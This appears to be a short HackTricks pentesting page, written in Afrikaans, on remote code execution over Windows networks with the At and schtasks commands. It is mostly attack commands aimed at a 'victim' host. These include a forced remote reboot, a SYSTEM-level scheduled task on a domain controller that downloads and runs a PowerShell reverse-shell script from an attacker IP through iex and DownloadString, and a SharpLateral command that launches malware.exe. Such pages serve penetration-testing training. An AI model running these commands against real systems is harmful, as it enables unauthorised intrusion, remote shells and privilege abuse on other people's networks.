# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe Werk Dit

At laat jou toe om take te skeduleer in gasheer waar jy gebruikersnaam/(wagwoord/Hash) ken. So, jy kan dit gebruik om opdragte in ander gasheer uit te voer en die uitvoer te verkry.
```
At \\victim 11:00:00PM shutdown -r
```
Met schtasks moet jy eers die taak skep en dit dan aanroep:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
U kan ook [SharpLateral](https://github.com/mertdas/SharpLateral) gebruik.
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Meer inligting oor die [**gebruik van schtasks met silver tickets hier**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
